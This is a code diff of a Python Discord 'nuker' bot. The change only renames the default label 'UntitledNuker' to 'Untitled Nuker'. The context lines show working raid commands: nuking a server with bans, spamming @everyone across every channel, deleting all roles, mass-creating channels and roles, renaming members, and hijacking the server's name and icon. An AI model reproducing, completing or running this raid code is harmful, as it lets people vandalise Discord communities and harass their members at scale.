@@ -138,7 +138,7 @@ async def help(ctx):
     await ctx.message.author.send(embed=embed)
 
 @bot.command(name='1', aliases=["nk", "nuke"])
-async def nuke(ctx, ban: bool=True, text="UntitledNuker"):
+async def nuke(ctx, ban: bool=True, text="Untitled Nuker"):
     await msg_delete(ctx)
 
     icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
@@ -209,7 +209,7 @@ async def renameEveryone(ctx, *, name="UntitledNuker"):
             print(f"{msgs['info']} {m.name} is owner")
 
 @bot.command(name="5", aliases=["sa"])
-async def spamToAllChannels(ctx, amount: int=50, *, text="@everyone UntitledNuker"):
+async def spamToAllChannels(ctx, amount: int=50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
         for ch in ctx.guild.channels:
@@ -220,7 +220,7 @@ async def spamToAllChannels(ctx, amount: int=50, *, text="@everyone UntitledNuke
                 print(f"{msgs['error']} Can't send message to {ch}")
 
 @bot.command(name='6', aliases=["sc"])
-async def spamToCurrentChannel(ctx, amount: int=50, *, text="@everyone UntitledNuker"):
+async def spamToCurrentChannel(ctx, amount: int=50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -250,7 +250,7 @@ async def deleteAllRoles(ctx):
             print(f"{msgs['error']} Can't delete {r}")
     
 @bot.command(name="9", aliases=["sch"])
-async def spamWithChannels(ctx, amount: int=25, *, name="UntitledNuker"):
+async def spamWithChannels(ctx, amount: int=25, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -260,7 +260,7 @@ async def spamWithChannels(ctx, amount: int=25, *, name="UntitledNuker"):
             print(f"{msgs['error']} Can't create channel")
 
 @bot.command(name="10", aliases=["sr"])
-async def spamWithRoles(ctx, amount: int=25, *, name="UntitledNuker"):
+async def spamWithRoles(ctx, amount: int=25, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -284,7 +284,7 @@ async def editServerIcon(ctx):
         print(f"{msgs['error']} Can't change server icon")
 
 @bot.command(name='12', aliases=["sn"])
-async def editServerName(ctx, *, name="UntitledNuker"):
+async def editServerName(ctx, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     try:
         await ctx.guild.edit(name=name)
@@ -298,7 +298,7 @@ async def reviveGuild(ctx, guildId: int=None):
     if guildId:
         guild = bot.get_guild(guildId)
         try:
-            await guild.create_text_channel(name="UntitledNuker")
+            await guild.create_text_channel(name="Untitled Nuker")
             print(f"{msgs['+']} Revived {guild}")
         except:
             print(f"{msgs['error']} Can't revive {guild} :(")
